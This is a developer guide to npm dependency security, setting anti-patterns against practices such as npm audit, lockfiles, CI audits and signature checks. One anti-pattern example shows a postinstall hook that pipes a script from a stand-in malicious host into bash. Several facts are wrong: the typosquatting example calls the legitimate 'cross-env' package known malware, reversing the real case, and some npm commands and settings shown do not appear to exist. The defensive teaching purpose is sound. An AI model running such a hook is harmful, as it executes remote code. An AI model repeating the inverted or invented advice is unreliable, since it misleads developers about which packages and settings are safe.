# Dependency Security

Never deploy with known vulnerabilities in dependencies. Outdated packages contain exploitable security flaws that attackers actively target.

## Why This Matters

Vulnerable dependencies enable:
- **Remote Code Execution**: Critical vulnerabilities allow attackers to run arbitrary code
- **Data Breaches**: SQL injection, XSS, or authentication bypass in libraries
- **Supply Chain Attacks**: Compromised packages inject malicious code
- **Known Exploits**: Public CVEs have documented attack vectors

A single outdated package with a critical vulnerability exposes your entire application. Attackers scan for known vulnerabilities using automated tools. The Log4j vulnerability (CVE-2021-44228) affected millions of applications worldwide.

## Anti-Patterns to Avoid

### ❌ NEVER: Ignore npm audit Warnings

```bash
# ❌ NEVER: Skip security audits
npm install
# 23 vulnerabilities (5 critical, 10 high, 8 moderate)
# ❌ Developer ignores warnings and deploys

# ❌ NEVER: Use --force to bypass warnings
npm install --force
# Ignores all warnings and installs anyway
```

**Risk:** Critical - Known vulnerabilities deployed to production

---

### ❌ NEVER: Use Wildcard Version Ranges

```json
{
  "dependencies": {
    "express": "*",
    "axios": "^1.x",
    "lodash": ">=4.0.0"
  }
}
```

**Risk:** High - Automatically pulls vulnerable versions, unpredictable behavior

---

### ❌ NEVER: Install Packages from Unknown Sources

```bash
# ❌ NEVER: Install from random GitHub repos
npm install github:random-user/suspicious-package

# ❌ NEVER: Install packages with typosquatting names
npm install expres # Typo of "express" - could be malicious!
npm install cross-env # Typo of "crossenv" - known malware

# ❌ NEVER: Install packages without checking reputation
npm install brand-new-package-no-downloads
# Package has 0 downloads, no GitHub repo, created yesterday
```

**Risk:** Critical - Supply chain attack, malicious code execution

---

### ❌ NEVER: Run npm Scripts Without Reviewing

```json
{
  "scripts": {
    "postinstall": "curl http://malicious-site.com/steal.sh | bash"
  }
}
```

**Risk:** Critical - Malicious packages execute code during installation

---

### ❌ NEVER: Use Outdated Major Versions

```json
{
  "dependencies": {
    "express": "3.0.0",
    "mongoose": "4.0.0",
    "react": "15.0.0"
  }
}
```

**Risk:** High - Multiple known vulnerabilities, no security patches

---

## Correct Patterns

### ✅ ALWAYS: Run npm audit Before Deployment

```bash
# ✅ Check for vulnerabilities
npm audit

# ✅ Fix automatically when possible
npm audit fix

# ✅ Review and fix manually if needed
npm audit fix --force # Only if you understand the changes

# ✅ View detailed vulnerability report
npm audit --json > audit-report.json

# ✅ Fail CI/CD if vulnerabilities found
npm audit --audit-level=moderate
# Exit code 1 if moderate or higher vulnerabilities found
```

**Benefit:** Identifies and fixes known vulnerabilities before deployment

---

### ✅ ALWAYS: Use Exact or Tilde Version Ranges

```json
{
  "dependencies": {
    "express": "4.18.2",
    "axios": "~1.6.0",
    "lodash": "4.17.21"
  }
}
```

**Benefit:** Predictable versions, controlled updates, easier to audit

---

### ✅ ALWAYS: Lock Dependencies with package-lock.json

```bash
# ✅ Commit package-lock.json to version control
git add package-lock.json
git commit -m "Lock dependencies"

# ✅ Use ci command in production/CI
npm ci
# Installs exact versions from package-lock.json
# Fails if package.json and package-lock.json don't match

# ❌ NEVER use npm install in CI/production
npm install # Can install different versions than package-lock.json
```

**Benefit:** Consistent installs across all environments, no version drift

---

### ✅ ALWAYS: Audit Dependencies Regularly

```typescript
// ✅ Automated dependency auditing in CI/CD
// .github/workflows/security.yml
/*
name: Security Audit
on:
  schedule:
    - cron: '0 0 * * *' # Daily
  push:
    branches: [main]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm audit --audit-level=high
*/

// ✅ Automated PRs for dependency updates
// Configure Dependabot or Renovate
// .github/dependabot.yml
/*
version: 2
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: weekly
    open-pull-requests-limit: 10
    versioning-strategy: increase
*/
```

**Benefit:** Continuous monitoring, automated security patches

---

### ✅ ALWAYS: Verify Package Integrity

```bash
# ✅ Check package reputation before installing
npm info package-name

# Output shows:
# - Download count (higher = more trusted)
# - Last publish date (recent updates good)
# - Repository URL (verify legitimate source)
# - Maintainers (check if known developers)

# ✅ Review package before installing
npm view package-name repository
# Verify GitHub URL is legitimate

npm view package-name maintainers
# Check if maintainers are known/trusted

# ✅ Check package size (suspiciously large = potential malware)
npm view package-name dist.unpackedSize
```

**Benefit:** Avoids supply chain attacks from malicious packages

---

### ✅ ALWAYS: Use npm audit in CI/CD Pipeline

```yaml
# ✅ .github/workflows/ci.yml
name: CI
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Security audit
        run: npm audit --audit-level=moderate
        # Fails if moderate or higher vulnerabilities

      - name: Check for outdated packages
        run: npm outdated || true # Warning only

  test:
    needs: security # Only run tests if security passes
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm ci
      - run: npm test
```

**Benefit:** Prevents vulnerable code from being deployed

---

### ✅ ALWAYS: Review Dependency Changes in PRs

```bash
# ✅ Check what changed in package-lock.json
git diff main -- package-lock.json

# ✅ Review dependency updates carefully
npm ls package-name # See why package is installed (direct or transitive)

# ✅ Check for unexpected dependencies
npm ls # View full dependency tree
# Look for unfamiliar packages
```

**Benefit:** Catches malicious or unexpected dependency changes

---

### ✅ ALWAYS: Minimize Dependencies

```typescript
// ❌ NEVER: Install entire library for one function
import _ from 'lodash'; // 24KB gzipped
const result = _.uniq(array);

// ✅ ALWAYS: Use native JavaScript when possible
const result = [...new Set(array)]; // Native, 0KB

// ✅ Or import specific function only
import uniq from 'lodash/uniq'; // Smaller bundle

// ❌ NEVER: Install unnecessary packages
// moment.js (232KB) when date-fns (17KB) or native Date suffices

// ✅ Evaluate necessity before installing
// - Can I use native JavaScript?
// - Is there a smaller alternative?
// - Do I really need this feature?
```

**Benefit:** Fewer dependencies = smaller attack surface, faster installs

---

### ✅ ALWAYS: Use Security Scanning Tools

```bash
# ✅ Snyk - Advanced vulnerability scanning
npm install -g snyk
snyk auth
snyk test # Scan for vulnerabilities
snyk monitor # Continuous monitoring

# ✅ npm audit alternatives
npx audit-ci --moderate # Fail CI on moderate+

# ✅ OSS Review Toolkit
npm install -g ort
ort analyze -i . -o ort-results

# ✅ Socket.dev - Supply chain security
npx socket-cli ci

# ✅ GitHub Advanced Security (if available)
# Enable in repository settings → Security → Code scanning
```

**Benefit:** More comprehensive vulnerability detection than npm audit alone

---

### ✅ ALWAYS: Monitor for Security Advisories

```bash
# ✅ Subscribe to security advisories
npm config set security-advisory-frequency daily

# ✅ GitHub Watch for security updates
# Click "Watch" → "Custom" → "Security alerts" on dependencies

# ✅ Enable GitHub Dependabot alerts
# Settings → Security & analysis → Dependabot alerts

# ✅ Follow security blogs
# - Node.js Security Releases: https://nodejs.org/en/blog/vulnerability/
# - npm Blog: https://blog.npmjs.org/
# - Snyk Vulnerability Database: https://security.snyk.io/
```

**Benefit:** Proactive notification of new vulnerabilities

---

### ✅ ALWAYS: Keep Node.js Updated

```bash
# ✅ Use LTS (Long Term Support) version
nvm install --lts
nvm use --lts

# ✅ Update Node.js regularly
nvm install 18 # Latest 18.x
nvm use 18

# ✅ Specify Node.js version in package.json
{
  "engines": {
    "node": ">=18.0.0 <19.0.0"
  }
}

# ✅ Use .nvmrc for consistent versions
echo "18" > .nvmrc
nvm use # Automatically uses version from .nvmrc
```

**Benefit:** Security patches, performance improvements, modern features

---

### ✅ ALWAYS: Verify Package Signatures

```bash
# ✅ Enable signature verification (npm 8.15.0+)
npm config set audit-signatures true

# ✅ Verify specific package
npm audit signatures

# ✅ Check registry signatures
npm view package-name dist.signatures
```

**Benefit:** Ensures packages haven't been tampered with

---

## Pre-Deployment Checklist

Before deploying to production:

- [ ] npm audit run with no high or critical vulnerabilities
- [ ] package-lock.json committed to version control
- [ ] Dependencies use exact or tilde version ranges (not wildcards)
- [ ] All direct dependencies actively maintained (check last update)
- [ ] No dependencies from unknown or untrusted sources
- [ ] Dependency count minimized (only necessary packages)
- [ ] Node.js version is latest LTS
- [ ] CI/CD pipeline fails on high/critical vulnerabilities
- [ ] Dependabot or Renovate configured for automated updates
- [ ] Security advisories monitored for critical dependencies
- [ ] npm ci used in production (not npm install)
- [ ] Transitive dependencies reviewed (npm ls)
- [ ] No packages with known malware or suspicious behavior
- [ ] Package signatures verified (if available)
